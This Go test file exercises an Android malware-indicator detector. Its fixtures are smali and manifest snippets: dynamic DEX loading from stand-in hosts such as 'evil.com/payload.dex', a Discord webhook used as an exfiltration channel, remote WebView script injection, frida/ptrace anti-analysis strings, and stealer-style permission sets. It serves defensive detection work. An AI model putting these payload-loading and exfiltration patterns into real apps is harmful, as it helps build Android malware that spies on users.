package pipeline

import (
	"strings"
	"testing"

	"mega-analyzer/pkg/internal/types"
)

// ═══════════════════════════════════════════════════════════════════════════════
// SMALI TESTS
// ═══════════════════════════════════════════════════════════════════════════════

func TestThreatDetector_DexClassLoader(t *testing.T) {
	d := NewThreatIndicatorsDetector()

	content := []byte(`
.class public Lcom/evil/Loader;
.super Ljava/lang/Object;

.method public load()V
    const-string v0, "https://evil.com/payload.dex"
    invoke-virtual {v0}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;
    new-instance v1, Ldalvik/system/DexClassLoader;
    invoke-direct {v1}, Ldalvik/system/DexClassLoader;-><init>()V
.end method
`)

	ctx := newTestContext("smali/com/evil/Loader.smali", content, types.FileTypeSmali)
	analysis := types.NewFileAnalysis(ctx.Path, ctx.FileType, int64(len(content)))

	d.Detect(ctx, analysis)

	fs := d.GetAggregator().GetSignals().Files[ctx.Path]
	if fs == nil {
		t.Fatal("expected file signals")
	}

	if !fs.Has(SignalDexClassLoader) {
		t.Error("expected SignalDexClassLoader")
	}
	if !fs.Has(SignalNetworkHTTPS) {
		t.Error("expected SignalNetworkHTTPS")
	}
	if !fs.Has(SignalDexSuffix) {
		t.Error("expected SignalDexSuffix")
	}
}

func TestThreatDetector_ReflectionNetwork(t *testing.T) {
	d := NewThreatIndicatorsDetector()

	content := []byte(`
.class public Lcom/obfuscated/R;
invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
invoke-virtual {v1, v2, v3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
const-string v4, "https://discord.com/api/webhooks/123/abc"
`)

	ctx := newTestContext("smali/com/obfuscated/R.smali", content, types.FileTypeSmali)
	analysis := types.NewFileAnalysis(ctx.Path, ctx.FileType, int64(len(content)))

	d.Detect(ctx, analysis)

	fs := d.GetAggregator().GetSignals().Files[ctx.Path]
	if !fs.Has(SignalReflectionForName) {
		t.Error("expected SignalReflectionForName")
	}
	if !fs.Has(SignalReflectionInvoke) {
		t.Error("expected SignalReflectionInvoke")
	}
	if !fs.Has(SignalDiscordWebhook) {
		t.Error("expected SignalDiscordWebhook")
	}
}

func TestThreatDetector_WebViewJSInterface(t *testing.T) {
	d := NewThreatIndicatorsDetector()

	content := []byte(`
.class public Lcom/app/WebViewActivity;
invoke-virtual {v0}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
invoke-virtual {v0, v1, v2}, Landroid/webkit/WebView;->addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V
invoke-virtual {v0, v3}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V
const-string v3, "https://remote.example.com/inject.js"
`)

	ctx := newTestContext("smali/com/app/WebViewActivity.smali", content, types.FileTypeSmali)
	analysis := types.NewFileAnalysis(ctx.Path, ctx.FileType, int64(len(content)))

	d.Detect(ctx, analysis)

	fs := d.GetAggregator().GetSignals().Files[ctx.Path]
	if !fs.Has(SignalWebViewJSInterface) {
		t.Error("expected SignalWebViewJSInterface")
	}
	if !fs.Has(SignalWebViewJSEnabled) {
		t.Error("expected SignalWebViewJSEnabled")
	}
	if !fs.Has(SignalWebViewLoadURL) {
		t.Error("expected SignalWebViewLoadURL")
	}
}

func TestThreatDetector_IPv4_SkipsReserved(t *testing.T) {
	d := NewThreatIndicatorsDetector()

	content := []byte(`
const-string v0, "192.168.1.1"
const-string v1, "10.0.0.1"
const-string v2, "45.67.89.123"
const-string v3, "127.0.0.1"
`)

	ctx := newTestContext("smali/Test.smali", content, types.FileTypeSmali)
	analysis := types.NewFileAnalysis(ctx.Path, ctx.FileType, int64(len(content)))

	d.Detect(ctx, analysis)

	// Should only find the public IP
	ipMatches := 0
	for _, m := range analysis.Matches {
		if m.Category == types.CategoryHardcodedIP {
			ipMatches++
			if m.Text != "45.67.89.123" {
				t.Errorf("expected 45.67.89.123, got %s", m.Text)
			}
		}
	}

	if ipMatches != 1 {
		t.Errorf("expected 1 IP match, got %d", ipMatches)
	}
}

func TestThreatDetector_SuspiciousTLD(t *testing.T) {
	d := NewThreatIndicatorsDetector()

	content := []byte(`
const-string v0, "https://evil-c2.xyz/payload"
const-string v1, "https://malware.ru/config"
const-string v2, "https://legitimate.com/api"
`)

	ctx := newTestContext("smali/Test.smali", content, types.FileTypeSmali)
	analysis := types.NewFileAnalysis(ctx.Path, ctx.FileType, int64(len(content)))

	d.Detect(ctx, analysis)

	tldMatches := 0
	for _, m := range analysis.Matches {
		// TLD reputation was retired: domain references are Info-level inventory.
		if m.Category == types.CategoryNetworkEndpoint && m.Severity == types.SeverityInfo &&
			strings.Contains(m.Context, "TLD does not establish reputation") {
			tldMatches++
		}
		if m.Category == types.CategorySuspiciousURL {
			t.Errorf("suspicious-TLD verdict must not return: %+v", m)
		}
	}

	if tldMatches != 2 {
		t.Errorf("expected 2 domain reference matches, got %d", tldMatches)
	}
}

// ═══════════════════════════════════════════════════════════════════════════════
// MANIFEST TESTS
// ═══════════════════════════════════════════════════════════════════════════════

func TestThreatDetector_ManifestPermissions(t *testing.T) {
	d := NewThreatIndicatorsDetector()

	content := []byte(`
<?xml version="1.0" encoding="utf-8"?>
<manifest>
    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
</manifest>
`)

	ctx := newTestContext("AndroidManifest.xml", content, types.FileTypeXML)
	analysis := types.NewFileAnalysis(ctx.Path, ctx.FileType, int64(len(content)))

	d.Detect(ctx, analysis)

	fs := d.GetAggregator().GetSignals().Files[ctx.Path]
	if fs == nil {
		t.Fatal("expected file signals")
	}

	if !fs.Has(SignalAccessibilityPermission) {
		t.Error("expected SignalAccessibilityPermission")
	}
	if !fs.Has(SignalPermissionSMS) {
		t.Error("expected SignalPermissionSMS")
	}
	if !fs.Has(SignalPermissionContacts) {
		t.Error("expected SignalPermissionContacts")
	}
	if !fs.Has(SignalPermissionOverlay) {
		t.Error("expected SignalPermissionOverlay")
	}
}

// ═══════════════════════════════════════════════════════════════════════════════
// NATIVE TESTS
// ═══════════════════════════════════════════════════════════════════════════════

func TestThreatDetector_NativeAntiAnalysis(t *testing.T) {
	d := NewThreatIndicatorsDetector()

	// Simulated .so content
	content := []byte("\x7fELF\x00\x00\x00\x00" +
		"some code here JNI_OnLoad more code " +
		"checking for frida detection " +
		"ptrace anti-debug " +
		"discord.com/api/webhooks")

	ctx := newTestContext("lib/arm64-v8a/libmalware.so", content, types.FileTypeNative)
	analysis := types.NewFileAnalysis(ctx.Path, ctx.FileType, int64(len(content)))

	d.Detect(ctx, analysis)

	fs := d.GetAggregator().GetSignals().Files[ctx.Path]
	if fs == nil {
		t.Fatal("expected file signals")
	}

	if !fs.Has(SignalFrida) {
		t.Error("expected SignalFrida")
	}
	if !fs.Has(SignalPtrace) {
		t.Error("expected SignalPtrace")
	}
	if !fs.Has(SignalNativeC2) {
		t.Error("expected SignalNativeC2")
	}

	// Should have correlation match for anti-analysis + payload
	found := false
	for _, m := range analysis.Matches {
		if m.Text == "ANTI_ANALYSIS+PAYLOAD" {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected ANTI_ANALYSIS+PAYLOAD correlation match")
	}
}

// ═══════════════════════════════════════════════════════════════════════════════
// CORRELATION TESTS
// ═══════════════════════════════════════════════════════════════════════════════

func TestThreatAggregator_DexFromNetworkCorrelation(t *testing.T) {
	d := NewThreatIndicatorsDetector()

	// The coarse correlation may be used only when all indicators live in one
	// analysis unit. Different files need a data-flow/call-graph proof.
	content := []byte(`
.class public Lcom/app/Downloader;
invoke-virtual {v0}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;
const-string v1, "https://evil.com/update.dex"
new-instance v0, Ljava/io/FileOutputStream;
invoke-virtual {v0, v1}, Ljava/io/FileOutputStream;->write([B)V
new-instance v0, Ldalvik/system/DexClassLoader;
invoke-direct {v0}, Ldalvik/system/DexClassLoader;-><init>()V
`)
	ctx := newTestContext("smali/Downloader.smali", content, types.FileTypeSmali)
	analysis := types.NewFileAnalysis(ctx.Path, ctx.FileType, int64(len(content)))
	d.Detect(ctx, analysis)

	// Run correlations
	d.GetAggregator().RunCorrelations()

	signals := d.GetAggregator().GetSignals()

	// Should have DEX_FROM_NETWORK correlation
	found := false
	for _, corr := range signals.Correlations {
		if corr.Name == "DEX_FROM_NETWORK" {
			found = true
			if corr.Severity != SeverityCritical {
				t.Errorf("expected CRITICAL severity, got %v", corr.Severity)
			}
			break
		}
	}

	if !found {
		t.Error("expected DEX_FROM_NETWORK correlation")
	}
}

func TestThreatAggregator_DoesNotJoinDexChainAcrossFiles(t *testing.T) {
	d := NewThreatIndicatorsDetector()
	for path, content := range map[string]string{
		"smali/Net.smali":  "invoke-virtual {v0}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;\nconst-string v1, \"https://example.invalid/payload.dex\"",
		"smali/Save.smali": "new-instance v0, Ljava/io/FileOutputStream;\ninvoke-virtual {v0, v1}, Ljava/io/FileOutputStream;->write([B)V",
		"smali/Dex.smali":  "new-instance v0, Ldalvik/system/DexClassLoader;\ninvoke-direct {v0}, Ldalvik/system/DexClassLoader;-><init>()V",
	} {
		ctx := newTestContext(path, []byte(content), types.FileTypeSmali)
		analysis := types.NewFileAnalysis(ctx.Path, ctx.FileType, int64(len(content)))
		d.Detect(ctx, analysis)
	}
	d.GetAggregator().RunCorrelations()
	for _, corr := range d.GetAggregator().GetSignals().Correlations {
		if corr.Name == "DEX_FROM_NETWORK" {
			t.Fatalf("unrelated files must not form DEX_FROM_NETWORK: %+v", corr)
		}
	}
}

func TestThreatAggregator_AccessibilityAbuseCorrelation(t *testing.T) {
	d := NewThreatIndicatorsDetector()

	// Manifest with permission
	manifest := []byte(`
<manifest>
    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE"/>
</manifest>
`)
	ctxManifest := newTestContext("AndroidManifest.xml", manifest, types.FileTypeXML)
	analysisManifest := types.NewFileAnalysis(ctxManifest.Path, ctxManifest.FileType, int64(len(manifest)))
	d.Detect(ctxManifest, analysisManifest)

	// Service implementation
	service := []byte(`
.class public Lcom/evil/MyAccessibilityService;
.super Landroid/accessibilityservice/AccessibilityService;

.method public onAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()V
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z
.end method
`)
	ctxService := newTestContext("smali/MyAccessibilityService.smali", service, types.FileTypeSmali)
	analysisService := types.NewFileAnalysis(ctxService.Path, ctxService.FileType, int64(len(service)))
	d.Detect(ctxService, analysisService)

	// Run correlations
	d.GetAggregator().RunCorrelations()

	signals := d.GetAggregator().GetSignals()

	// Should have the accessibility UI-capabilities observation (formerly the
	// ACCESSIBILITY_ABUSE_FULL high-severity attribution).
	found := false
	for _, corr := range signals.Correlations {
		if corr.Name == "ACCESSIBILITY_UI_CAPABILITIES" {
			found = true
			if corr.Severity != SeverityInfo || corr.Score != 0 {
				t.Errorf("expected Info severity with score 0, got %v/%d", corr.Severity, corr.Score)
			}
			break
		}
	}

	if !found {
		t.Error("expected ACCESSIBILITY_UI_CAPABILITIES correlation")
	}
}

func TestThreatAggregator_StealerCombo(t *testing.T) {
	d := NewThreatIndicatorsDetector()

	manifest := []byte(`
<manifest>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
</manifest>
`)
	ctx := newTestContext("AndroidManifest.xml", manifest, types.FileTypeXML)
	analysis := types.NewFileAnalysis(ctx.Path, ctx.FileType, int64(len(manifest)))
	d.Detect(ctx, analysis)

	d.GetAggregator().RunCorrelations()

	signals := d.GetAggregator().GetSignals()

	found := false
	for _, corr := range signals.Correlations {
		if corr.Name == "SENSITIVE_PERMISSION_PROFILE" {
			found = true
			// Permission declarations are an inventory profile, not a stealer verdict.
			if corr.Severity != SeverityInfo || corr.Score != 0 {
				t.Errorf("expected Info severity with score 0, got %v/%d", corr.Severity, corr.Score)
			}
			break
		}
	}

	if !found {
		t.Error("expected SENSITIVE_PERMISSION_PROFILE correlation")
	}
}

func TestThreatAggregator_ThreatScore(t *testing.T) {
	d := NewThreatIndicatorsDetector()

	// High-threat APK simulation
	content := []byte(`
.class public Lcom/malware/Core;
new-instance v0, Ldalvik/system/InMemoryDexClassLoader;
const-string v1, "https://discord.com/api/webhooks/123/abc"
invoke-virtual {v0}, Landroid/webkit/WebView;->addJavascriptInterface()V
`)
	ctx := newTestContext("smali/Core.smali", content, types.FileTypeSmali)
	analysis := types.NewFileAnalysis(ctx.Path, ctx.FileType, int64(len(content)))
	d.Detect(ctx, analysis)

	signals := d.GetAggregator().GetSignals()

	// InMemoryDexClassLoader (9) + DiscordWebhook (8) + WebViewJSInterface (7) = 24
	expectedMinScore := 20
	if signals.TotalScore < expectedMinScore {
		t.Errorf("expected score >= %d, got %d", expectedMinScore, signals.TotalScore)
	}

	severity := signals.GetSeverity()
	if severity != SeverityMedium && severity != SeverityHigh {
		t.Errorf("expected MEDIUM or HIGH severity, got %v", severity)
	}
}

// ═══════════════════════════════════════════════════════════════════════════════
// HELPERS
// ═══════════════════════════════════════════════════════════════════════════════

func newTestContext(path string, content []byte, fileType types.FileType) *FileDetectContext {
	return &FileDetectContext{
		Path:         path,
		Content:      content,
		ContentLower: bytesLower(content),
		LineOffsets:  types.NewLineOffsets(content),
		IsAppCode:    true,
		FileType:     fileType,
	}
}

func bytesLower(b []byte) []byte {
	out := make([]byte, len(b))
	for i := 0; i < len(b); i++ {
		c := b[i]
		if c >= 'A' && c <= 'Z' {
			c = c - 'A' + 'a'
		}
		out[i] = c
	}
	return out
}
